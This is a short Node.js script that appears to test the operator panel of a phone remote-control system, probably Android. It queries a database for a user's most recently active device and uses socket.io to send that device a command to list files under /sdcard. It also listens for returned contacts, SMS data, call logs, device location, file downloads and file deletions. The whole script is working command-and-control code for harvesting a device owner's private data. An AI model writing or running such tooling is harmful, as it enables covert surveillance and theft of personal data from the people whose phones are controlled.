// Send a known working action to the device: get-contacts or similar
const { io } = require("socket.io-client");
const { PrismaClient } = require("@prisma/client");

const PANEL_URL = "http://172.17.0.1:2700";
const USER_ID = "6a1f3e7686e8a5a78a59da67";

(async () => {
  const prisma = new PrismaClient();
  const dev = await prisma.clientDevice.findFirst({
    where: { userId: USER_ID, status: true },
    orderBy: { lastSeen: "desc" },
  });
  console.log(`[setup] device: ${dev?.deviceId} socket=${dev?.socketId}`);
  await prisma.$disconnect();

  const panel = io(PANEL_URL, {
    transports: ["websocket", "polling"],
    query: { userId: USER_ID, type: "frontend" },
    forceNew: true,
  });

  panel.on("connect", () => {
    console.log(`[panel] connected id=${panel.id}`);
    setTimeout(() => {
      // Try the file-list action
      const sid = `t_${Date.now()}`;
      panel.emit("server_command_to_user", {
        socketId: sid,
        toClient: dev.socketId,
        user_id: USER_ID,
        device_id: dev.deviceId,
        from: "panel",
        type: "server_command",
        command: { action: "file-list", path: "/sdcard", source: "files" },
        extra: { socketId: sid },
      });
      console.log(`[panel] sent file-list`);
    }, 500);
  });

  // Listen for any response
  ["file_list_result", "file_data", "file_delete_result", "file_upload_result",
   "contact_info", "sms_data", "call_log_data", "device_location", "device_created",
   "device_updated", "server_command", "client_log"].forEach((evt) => {
    panel.on(evt, (payload) => {
      console.log(`[panel] event=${evt} payload=`, JSON.stringify(payload).slice(0, 200));
    });
  });

  setTimeout(() => {
    console.log("[panel] exiting");
    panel.disconnect();
    process.exit(0);
  }, 20000);
})().catch((e) => { console.error(e); process.exit(1); });
